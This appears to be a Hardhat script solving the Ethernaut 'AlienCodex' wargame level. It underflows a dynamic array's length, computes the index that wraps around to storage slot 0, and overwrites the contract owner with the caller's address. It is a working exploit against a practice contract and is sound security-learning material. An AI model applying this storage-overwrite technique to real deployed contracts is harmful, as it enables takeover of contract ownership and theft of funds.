import { expect } from "chai";
import { BigNumber } from "ethers";
import { ethers, waffle } from "hardhat";
import { AlienCodex, AlienCodex__factory } from "../typechain";

async function main() {
  const [addr1] = await ethers.getSigners();
  const provider = waffle.provider;
  const deployedAddress = '0x8D4d8459f3cA93DDdF7cF81fC4d37dAbC02712c0';
  const alienInstance: AlienCodex = AlienCodex__factory.connect(deployedAddress, addr1);
  await (await alienInstance.make_contact()).wait(1)
  await (await alienInstance.retract()).wait(1)
  const paddedSlot = ethers.utils.hexZeroPad("0x01", 32)
  const zeroIndex = BigNumber.from(2).pow(256).sub(ethers.utils.keccak256(paddedSlot))
  const paddedAddress = ethers.utils.hexZeroPad(addr1.address, 32);
  await (await alienInstance.revise(zeroIndex, paddedAddress)).wait(1)
  console.log(paddedSlot.toString())
  console.log(zeroIndex.toString())
  console.log(paddedAddress.toString())
  console.log(await alienInstance.owner())
  expect(await alienInstance.owner()).to.be.eq(addr1.address)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
